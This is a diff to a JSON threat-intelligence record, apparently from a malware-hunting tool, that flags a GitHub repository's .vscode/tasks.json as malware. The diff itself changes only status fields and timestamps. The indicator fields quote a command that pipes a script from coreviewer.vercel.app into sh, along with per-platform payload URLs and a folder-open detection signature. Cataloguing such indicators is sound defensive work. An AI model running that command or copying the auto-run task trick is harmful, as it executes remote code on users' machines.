@@ -19,10 +19,10 @@
     "iocs": "coreviewer.vercel.app; https://coreviewer.vercel.app/task/mac?token=40ae0f7a9f70; https://coreviewer.vercel.app/task/linux?token=40ae0f7a9f70; https://coreviewer.vercel.app/task/windows?token; curl 'https://coreviewer.vercel.app/task/mac?token=40ae0f7a9f70' | sh; .vscode/tasks.json",
     "matched_signatures": "folderOpen curl filename:tasks.json",
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 5)",
-    "osm_status": "submitted",
-    "osm_threat_id": "9b0887b2-8013-42c2-9d8f-e2f0f6473659",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/cataclypsme_old-web3-project.json",
     "reviewer_decision": "",
     "notes": ""
@@ -65,7 +65,7 @@
     "evidence_references": "https://github.com/cataclypsme/old-web3-project/blob/30769cd2e320de54b3347dd5c2bef736b741f2ef/.vscode/tasks.json",
     "verified_iocs": "coreviewer.vercel.app\nhttps://coreviewer.vercel.app/task/mac?token=40ae0f7a9f70\nhttps://coreviewer.vercel.app/task/linux?token=40ae0f7a9f70\nhttps://coreviewer.vercel.app/task/windows?token\ncurl 'https://coreviewer.vercel.app/task/mac?token=40ae0f7a9f70' | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
